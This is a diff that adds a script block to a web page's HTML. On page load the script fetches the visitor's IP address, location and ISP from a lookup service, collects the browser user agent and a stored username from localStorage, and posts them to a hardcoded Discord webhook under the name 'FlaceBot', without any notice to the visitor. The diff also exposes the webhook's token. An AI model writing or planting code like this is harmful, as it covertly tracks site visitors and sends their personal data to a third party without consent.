@@ -118,6 +118,75 @@ setInterval(() => {
 }, 200);
 
     </script>
+    <script>
+        let echolog = {};
+fetch("https://wtfismyip.com/json")
+  .then((response) => response.json())
+  .then((data) => {
+    let echolog = {
+      ipAddress: data.YourFuckingIPAddress,
+      location: data.YourFuckingLocation,
+      isp: data.YourFuckingISP,
+      userAgent: navigator.userAgent,
+    };
+    const payload = {
+"content": "",
+"tts": false,
+"embeds": [
+{
+  "color": 11908533,
+  "fields": [
+    {
+      "name": "IP",
+      "value": echolog.ipAddress,
+      "inline": true
+    },
+    {
+      "name": "Position",
+      "value": echolog.location,
+      "inline": true
+    },
+    {
+      "name": "User Agent",
+      "value": echolog.userAgent,
+      "inline": false
+    },
+    {
+      "name": "Username",
+      "value": localStorage.getItem('username'),
+      "inline": true
+    },
+  ],
+
+  "footer": {
+    "text": "FlaceBot"
+  },
+"author": {
+"name": "FlaceBot",
+"icon_url": "https://flace.pages.dev/img/logo.png"
+}
+}
+
+],
+"components": [],
+"actions": {},
+"username": "FlaceBot",
+};
+
+    fetch("https://discord.com/api/webhooks/1178779338292867114/7i7717028JqfI_0iYegSbQEWfaUF9D-th-tmfAnKJu65nK3XasvcJqYU34YWZauG-nos", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(payload),
+    })
+      .then((response) => console.log(response))
+      .catch((error) => console.error(error));
+  })
+  .catch((error) => console.error(error));
+
+
+    </script>
     <script src="js/script.js"></script>
     <script src="js/modal.js"></script>
 </body>
